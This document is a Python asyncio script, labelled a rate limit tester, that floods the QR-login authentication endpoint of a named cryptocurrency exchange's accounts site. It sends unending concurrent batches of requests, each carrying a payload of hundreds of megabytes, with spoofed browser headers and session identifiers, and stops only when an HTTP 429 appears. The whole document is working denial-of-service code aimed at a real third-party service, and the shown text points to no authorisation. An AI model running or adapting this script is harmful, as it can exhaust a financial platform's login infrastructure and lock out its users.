import asyncio
import aiohttp
import time
from collections import Counter
import json

class RateLimitTester:
    def __init__(self, base_url, session_token, tmx_session_id, anonymous_id):
        self.base_url = base_url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': f'{base_url}/en-US/login',
            'Content-Type': 'application/json',
            'Session-Token': session_token,
            'Tmx-Session-Id': tmx_session_id,
            'X-Anonymous-Id': anonymous_id,
            'Origin': base_url,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=4'
        }
        self.endpoint = f"{base_url}/api/proxy/private/authnz/v1/authentication/qr"
        self.batch_size = 10
        self.payload_size_mb = 100
        self.session = None
        self.batch_counter = 0
        self.status_counter = Counter()
        self.rate_limit_hit = False

    def generate_large_payload(self):
        """Generate a large payload for the data field"""
        target_size = self.payload_size_mb * 1024 * 1024
        base_payload = {"data": ""}
        base_size = len(json.dumps(base_payload))
        data_needed = target_size - base_size

        if data_needed <= 0:
            base_payload["data"] = "A"
        else:
            base_payload["data"] = "A" * data_needed
        return base_payload

    async def send_single_request(self, session, request_id):
        payload = self.generate_large_payload()
        try:
            start_time = time.time()
            async with session.post(
                self.endpoint,
                json=payload,
                headers=self.headers,
                timeout=aiohttp.ClientTimeout(total=120)
            ) as response:
                response_time = time.time() - start_time
                return {
                    'status': response.status,
                    'request_id': request_id,
                    'response_time': response_time,
                    'headers': dict(response.headers)
                }
        except asyncio.TimeoutError:
            return {'status': 'timeout', 'request_id': request_id}
        except aiohttp.ClientError as e:
            return {'status': f'client_error: {str(e)}', 'request_id': request_id}
        except Exception as e:
            return {'status': f'error: {str(e)}', 'request_id': request_id}

    async def send_batch(self):
        self.batch_counter += 1
        batch_id = self.batch_counter

       
        print(f" BATCH {batch_id}:")

        tasks = []
        for i in range(self.batch_size):
            request_id = (batch_id - 1) * self.batch_size + i + 1
            task = self.send_single_request(self.session, request_id)
            tasks.append(task)

        results = await asyncio.gather(*tasks, return_exceptions=True)

        batch_status_codes = []
        successful_requests = []

        for result in results:
            if isinstance(result, Exception):
                status = f'exception: {str(result)}'
                batch_status_codes.append(status)
            else:
                status = result['status']
                batch_status_codes.append(status)

                if status == 429:
                    print(f" RATE LIMIT HIT! Request {result['request_id']} received status 429")
                    self.rate_limit_hit = True

                if isinstance(status, int) and 200 <= status < 300:
                    successful_requests.append(result)

        self.status_counter.update(batch_status_codes)
        self.print_batch_results(batch_id, batch_status_codes, successful_requests)
        return batch_status_codes

    def print_batch_results(self, batch_id, status_codes, successful_requests):
        batch_stats = Counter(status_codes)

    
      

        for status, count in batch_stats.most_common():
            percentage = (count / len(status_codes)) * 100
            print(f"  {status}: {count} requests ({percentage:.1f}%)")

        success_count = sum(1 for status in status_codes if isinstance(status, int) and 200 <= status < 300)
        success_rate = (success_count / len(status_codes)) * 100
      

        if successful_requests:
            response_times = [req['response_time'] for req in successful_requests]
            avg_time = sum(response_times) / len(response_times)
          

        print("-" * 40)

    def print_final_summary(self):
        total_requests = self.batch_counter * self.batch_size
        print(f"\n{'='*60}")
        print(f" TEST COMPLETED - FINAL SUMMARY")
        print(f"{'='*60}")
        print(f"Total batches sent: {self.batch_counter}")
        print(f"Total requests sent: {total_requests}")
        print(f"Payload size per request: {self.payload_size_mb}MB")
        print(f"Endpoint: {self.endpoint}")
        print(f"\n OVERALL STATUS CODE DISTRIBUTION:")
        print("-" * 50)

        for status, count in self.status_counter.most_common():
            percentage = (count / total_requests) * 100
            print(f"  {status}: {count} requests ({percentage:.1f}%)")

        print(f"{'='*60}")
        if self.rate_limit_hit:
            print(" TEST STOPPED: Rate limit (429) detected!")
        else:
            print(" TEST STOPPED: Manual interruption or error occurred.")

    async def run_test(self):
        print(f"   - Endpoint: {self.endpoint}")
        print(f"   - Payload size: {self.payload_size_mb}MB & Batch size: {self.batch_size}")
        print(f"{'='*60}")

        async with aiohttp.ClientSession() as session:
            self.session = session
            try:
                while not self.rate_limit_hit:
                    await self.send_batch()
                    if not self.rate_limit_hit:
                        print("-")
                        await asyncio.sleep(0.3)
            except KeyboardInterrupt:
                print("\n  Test interrupted by user")
            except Exception as e:
                print(f"\n Error during test: {str(e)}")

        self.print_final_summary()


# Configuration
CONFIG = {
    'base_url': 'https://accounts.crypto.com',
    'session_token': 'YOUR_SESSION_TOKEN_HERE',
    'tmx_session_id': '3016deb2-99c8-4b90-99b9-e58acff8aea7',
    'anonymous_id': '1b87911b-94e0-49d7-853a-94894a7b454a',
    'batch_size': 5,
    'payload_size_mb': 500
}

async def main():
    tester = RateLimitTester(
        base_url=CONFIG['base_url'],
        session_token=CONFIG['session_token'],
        tmx_session_id=CONFIG['tmx_session_id'],
        anonymous_id=CONFIG['anonymous_id']
    )
    tester.batch_size = CONFIG['batch_size']
    tester.payload_size_mb = CONFIG['payload_size_mb']
    await tester.run_test()

try:
    import nest_asyncio
    nest_asyncio.apply()
except ImportError:
    pass


await main()
